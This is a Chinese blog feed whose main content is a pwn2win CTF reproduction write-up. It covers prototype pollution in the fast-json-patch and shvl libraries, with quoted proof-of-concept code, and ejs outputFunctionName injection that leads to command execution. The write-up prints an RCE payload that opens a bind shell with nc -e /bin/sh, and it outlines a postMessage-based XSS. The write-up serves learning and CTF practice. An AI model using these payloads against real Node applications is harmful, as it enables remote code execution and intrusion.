<p>该hook一般搭配useEffect 来使用。</p>
<h1 id="useEffect"><a href="#useEffect" class="headerlink" title="useEffect"></a>useEffect</h1><p>常用情况：</p>
<p>​    基本上只要用到了异步，轮询你都必须接触到这个hook。具体例子如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">useEffect(</span><br><span class="line">        ()=&gt;&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;http://154.8.144.57:8000/api/log/&#x27;</span>)</span><br><span class="line">            .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.json())</span><br><span class="line">            .then(<span class="function">(<span class="params">json</span>) =&gt;</span> setData(json.logs))</span><br><span class="line">            .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;fetch data failed&#x27;</span>, error);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,[]);</span><br></pre></td></tr></table></figure>

<p>它可以帮助你在初始化页面的时候进行一次数据的采集，如果第二个参数为你的期望值，如果与期望值不同的话就会重新尝试获取数据，换句话说它可以做到两个事情</p>
<ul>
<li>开局替你获取数据</li>
<li>使用轮询的方式刷新数据</li>
</ul>
<h1 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h1><p>一开始的时候我不会写，所以很多时候别人的工程代码也很难看懂，但是当我明白之后发现还是相当好用的，他最大的好处就是让你从this这个扯淡的东西摆脱出来了。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Menu.Item key=<span class="string">&quot;1&quot;</span> onClick=&#123;<span class="function">()=&gt;</span> history.push(<span class="string">&#x27;/admin/unitControl&#x27;</span>)&#125; &gt;主机管理&lt;/Menu.Item&gt;</span><br><span class="line">&lt;Menu.Item key=<span class="string">&quot;2&quot;</span> onClick=&#123;<span class="function">() =&gt;</span> history.push(<span class="string">&#x27;/admin/processControl&#x27;</span>)&#125; &gt;进程管理&lt;/Menu.Item&gt;</span><br><span class="line">&lt;Menu.Item key=<span class="string">&quot;3&quot;</span> onClick=&#123;<span class="function">() =&gt;</span> history.push(<span class="string">&#x27;/admin/portControl&#x27;</span>)&#125; &gt;端口管理&lt;/Menu.Item&gt;</span><br><span class="line">&lt;Menu.Item key=<span class="string">&quot;4&quot;</span> onClick=&#123;<span class="function">()=&gt;</span>history.push(<span class="string">&#x27;/admin/logControl&#x27;</span>)&#125; &gt;历史日志监控&lt;/Menu.Item&gt;</span><br></pre></td></tr></table></figure>



<p><img src="image-20210530195849041.png" alt="image-20210530195849041"></p>
<p>附上官方的url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;developer.mozilla.org&#x2F;zh-CN&#x2F;docs&#x2F;Web&#x2F;JavaScript&#x2F;Reference&#x2F;Functions&#x2F;Arrow_functions</span><br></pre></td></tr></table></figure>

<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E6%B2%A1%E6%9C%89%E5%8D%95%E7%8B%AC%E7%9A%84this">没有单独的<code>this</code></a></p>
<p>在箭头函数出现之前，每一个新函数根据它是被如何调用的来定义这个函数的this值：</p>
<ul>
<li>如果是该函数是一个构造函数，this指针指向一个新的对象</li>
<li>在严格模式下的函数调用下，this指向undefined</li>
<li>如果是该函数是一个对象的方法，则它的this指针指向这个对象</li>
<li>等等</li>
</ul>
<p><code>This</code>被证明是令人厌烦的面向对象风格的编程。(这句话太对了，如果你项目工程一大this就很扯)</p>
<p>其他感觉没有啥了，react的官网的文档啊，真的是所有文档的典范，写的太清晰了。</p>
]]></content>
      <tags>
        <tag>Javascript</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn2win各种尝试复现</title>
    <url>/2021/06/01/pwn2win%E5%90%84%E7%A7%8D%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为美团。dozer和学校各种事情结果没能打上pwn2win，不过告一段落之后马上来做做国际赛长长见识，第一个就是。全都是node题目啊【不会】，不过感觉还是相当有趣的！</p>
<h1 id="illusion"><a href="#illusion" class="headerlink" title="illusion"></a>illusion</h1><p>这题是最简单的，也是最多人做出来的，可是我却不知道咋复现[因为我不会那个什么hashcash计算，希望有师傅看见了能告诉我呜呜</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><pre><code>+ 看附件
+ 原型链污染
+ ejs RCE</code></pre>
<p>题目开出给了dockerfile(重要)和 源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jsonpatch = <span class="built_in">require</span>(<span class="string">&#x27;fast-json-patch&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> basicAuth = <span class="built_in">require</span>(<span class="string">&#x27;express-basic-auth&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middlewares //</span></span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(basicAuth(&#123;</span><br><span class="line">    users: &#123; <span class="string">&quot;admin&quot;</span>: process.env.SECRET || <span class="string">&quot;admin&quot;</span> &#125;,</span><br><span class="line">    challenge: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> services = &#123;</span><br><span class="line">    status: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    cameras: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    doors: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    dome: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    turrets: <span class="string">&quot;online&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Static folder</span></span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/templates/index.ejs&quot;</span>, &#123;services&#125;)</span><br><span class="line">    res.end(html)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    jsonpatch.applyPatch(services, patch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;offline&quot;</span> <span class="keyword">in</span> <span class="built_in">Object</span>.values(services))&#123;</span><br><span class="line">        services.status = <span class="string">&quot;offline&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.json(services)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>



<p>代码很短，随便审计就审计完了，一般原型链污染都处于能够被用户自定义控制的地方，所以重点看看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">      jsonpatch.applyPatch(services, patch)</span><br></pre></td></tr></table></figure>

<p>发现他用了一个patch什么的，到package.json中可以看见：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express-basic-auth&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast-json-patch&quot;</span>: <span class="string">&quot;^3.0.0-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么应该就是这个fast-json-path库的问题，去github上搜搜看能够找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Starcounter-Jack&#x2F;JSON-Patch&#x2F;pull&#x2F;262</span><br></pre></td></tr></table></figure>



<p>别人给出的poc：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">let</span> fastjsonpatch = <span class="built_in">require</span>(<span class="string">&quot;fast-json-patch&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + a.polluted);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + b.polluted);</span><br><span class="line"><span class="keyword">const</span> patch = [&#123;<span class="attr">op</span>: <span class="string">&quot;replace&quot;</span>, <span class="attr">path</span>: <span class="string">&quot;/constructor/prototype/polluted&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;];</span><br><span class="line">fastjsonpatch.applyPatch(a, patch);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + a.polluted);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + b.polluted);</span><br></pre></td></tr></table></figure>

<p><img src="image-20210601220006513.png" alt="image-20210601220006513"></p>
<p>看了看不就和题目出的一模一样吗，但是话又回来，我们却发现即使能够原型链污染了好像还是没啥用啊草。</p>
<p><img src="image-20210601215202253.png" alt="image-20210601215202253"></p>
<p>这时候再观察package.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express-basic-auth&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast-json-patch&quot;</span>: <span class="string">&quot;^3.0.0-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现ejs，搜了一下ejs原来是一个可以用于RCE的点。只要污染outputFunctionName 这个点就可以进行命令执行。</p>
<p>那么尝试</p>
<p><img src="image-20210601215319818.png" alt="image-20210601215319818"></p>
<p>然后就可以发现写入了，但是看了别人的WP发现这样是不行的，因为还给了你dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> flag.txt /root/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy readflag binary (it just reads the flag)</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> readflag /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 4755 /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install web application</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /app &amp;&amp; npm install</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change to guest user</span></span><br><span class="line"><span class="keyword">USER</span> <span class="number">405</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># run application and stay alive for 5 minutes</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> entrypoint.sh / </span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure>



<p>可以看见作为guest我们是没有写入权限的，那么就只能去打反弹shell了，网上exp一大堆随便找一个来打就可以了</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;constructor/prototype/outputFunctionName&quot;: &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;whoami &gt;&gt; src/static/style.css&#x27;);x&quot;</span><br><span class="line">无法写入之后就打反弹shell</span><br><span class="line"> &quot;constructor/prototype/outputFunctionName&quot;: &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;nc -lvp 4444 -e /bin/sh&#x27;);x&quot;</span><br><span class="line"># 这里发现老外的思路又和我平常打反弹shell不一样，写成这样payload的话我们ncip过去就可以了</span><br></pre></td></tr></table></figure>



<h1 id="small-talk"><a href="#small-talk" class="headerlink" title="small-talk"></a>small-talk</h1><p>又是JS题目</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>原型链污染</li>
<li>XSS</li>
</ul>
<p>能够看到源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: gunicorn</span><br><span class="line"><span class="built_in">Date</span>: Tue, <span class="number">0</span>1 Jun <span class="number">2021</span> <span class="number">12</span>:<span class="number">0</span>8:<span class="number">22</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">Content-Length: <span class="number">2043</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Share your thoughts&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;/static/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://unpkg.com/shvl@latest/dist/shvl.umd.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://unpkg.com/@popperjs/core@2&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;wrap --rtn&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;form action=<span class="string">&quot;/admin&quot;</span> method=<span class="string">&quot;POST&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;flex-form&quot;</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;js-usr-new&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;select__label text&quot;</span>&gt;Share your coach phrases <span class="keyword">with</span> our admin&lt;/div&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;url&quot;</span> name=<span class="string">&quot;url&quot;</span> placeholder=<span class="string">&quot;address&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ui-elem ui-elem-email text&quot;</span> /&gt;</span><br><span class="line">        &lt;button id=<span class="string">&quot;send-button&quot;</span> type=<span class="string">&quot;submit&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ui-button text&quot;</span>&gt;send&lt;/button&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;send-tooltip&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;tooltip&quot;</span> role=<span class="string">&quot;tooltip&quot;</span>&gt;</span><br><span class="line">            go ahead, click me :)</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;tooltip-arrow&quot;</span> data-popper-arrow&gt;&lt;/div&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">      &lt;div id=<span class="string">&quot;quote&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;flex-form&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">&#x27;#quote-base&#x27;</span> src=<span class="string">&quot;/quotes&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> button = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#send-button&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> tooltip = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#send-tooltip&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> message = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#quote&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">window</span>.removeEventListener(<span class="string">&#x27;message&#x27;</span>, setup);</span><br><span class="line">          quote = &#123;<span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">          shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>]);</span><br><span class="line">          shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>]);</span><br><span class="line">          </span><br><span class="line">          message.textContent = <span class="built_in">Object</span>.values(quote)[<span class="number">1</span>] + <span class="string">&#x27; â &#x27;</span> + <span class="built_in">Object</span>.values(quote)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> popperInstance = Popper.createPopper(button, tooltip, &#123;</span><br><span class="line">              placement: <span class="string">&#x27;bottom&#x27;</span>,</span><br><span class="line">              modifiers: [</span><br><span class="line">                  &#123;</span><br><span class="line">                  name: <span class="string">&#x27;offset&#x27;</span>,</span><br><span class="line">                  options: &#123;</span><br><span class="line">                      offset: [<span class="number">0</span>, <span class="number">8</span>],</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#125;,</span><br><span class="line">              ],</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>发现有个quotes，进去看看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    phrases = [</span><br><span class="line">        &#123;<span class="string">&#x27;@entrepreneur&#x27;</span>: <span class="string">&#x27;The distance between your DREAMS and REALITY is called ACTION&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@successman&#x27;</span>: <span class="string">&#x27;MOTIVATION is what gets you started, HABIT is what keeps you going&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@bornrich&#x27;</span>: <span class="string">&#x27;It\&#x27;s hard to beat someone that never gives up&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@businessman&#x27;</span>: <span class="string">&#x27;Work while they sleep. Then live like they dream&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@bigboss&#x27;</span>: <span class="string">&#x27;Life begins at the end of your comfort zone&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@daytrader&#x27;</span>: <span class="string">&#x27;A successfull person never loses... They either win or learn!&#x27;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">6</span>)</span><br><span class="line">        parent.postMessage(<span class="string">&#x27;&#123;&quot;author&quot;: &quot;&#x27;</span> + <span class="built_in">Object</span>.keys(phrases[index])[<span class="number">0</span>] + <span class="string">&#x27;&quot;, &quot;message&quot;: &quot;&#x27;</span> + <span class="built_in">Object</span>.values(phrases[index])[<span class="number">0</span>] + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>然后就没了，想了半天去挨个搜require的东西，结果shvl这个就有问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robinvdvleuten&#x2F;shvl&#x2F;pull&#x2F;35</span><br></pre></td></tr></table></figure>

<p>别人给出的poc：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">var</span> shvl = <span class="built_in">require</span>(<span class="string">&quot;shvl&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before: &quot;</span> + &#123;&#125;.polluted)</span><br><span class="line">shvl.set(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After: &quot;</span> + &#123;&#125;.polluted)</span><br></pre></td></tr></table></figure>

<p><img src="image-20210601220413714.png" alt="image-20210601220413714"></p>
<p>然后翻这段代码，就可以发现</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>]);</span><br><span class="line">shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>



<p>然后我就不知道该咋做了，看带师傅们的博客发现这好像是XSS，可是这题靶机好像不太对了，别人都可以看见留言我看不见</p>
<p><img src="image-20210602153814107.png" alt="image-20210602153814107"></p>
<p><img src="120125921-18a7eb80-c1ed-11eb-98f8-ff40d667b324.png" alt="截圖 2021-05-31 上午8 36 30"></p>
<p>这道题是从 postMessage 中的条件竞争 到<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">原型污染</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonslab.me&#x2F;posts&#x2F;small-talk-writeup&#x2F;</span><br></pre></td></tr></table></figure>

<p>node的条件竞争还没见过。感觉很新颖可以拿来出题。</p>
<p>题目的思路为：</p>
<pre><code>+ 加载一个iframe并向postMessage父页面发送一个随机句子
+ 然后页面通过shvl解析
+ 之后放到页面上
+ 初始化[Popper.js](https://github.com/popperjs/popper-core)</code></pre>
]]></content>
      <tags>
        <tag>原型链污染</tag>
        <tag>node</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ejs调试check</title>
    <url>/2021/06/22/ejs%E8%B0%83%E8%AF%95check/</url>
    <content><![CDATA[<p>这篇主要是在跟着博客逐步的单步调试复现。这段时间打算深入学习一下node的调试</p>
<p>博客：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;evi0s.com&#x2F;2019&#x2F;08&#x2F;30&#x2F;expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce&#x2F;</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="built_in">JSON</span>.parse(req.body.content);</span><br><span class="line">    lodash.defaultsDeep(data, input);</span><br><span class="line">    res.json(&#123;<span class="attr">message</span>: <span class="string">&quot;OK&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> server = app.listen(<span class="number">8086</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port %d&#x27;</span>, server.address().port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>断点打在app.get，然后去访问8086端口</p>
<p><img src="image-20210622164732244.png" alt="image-20210622164732244"></p>
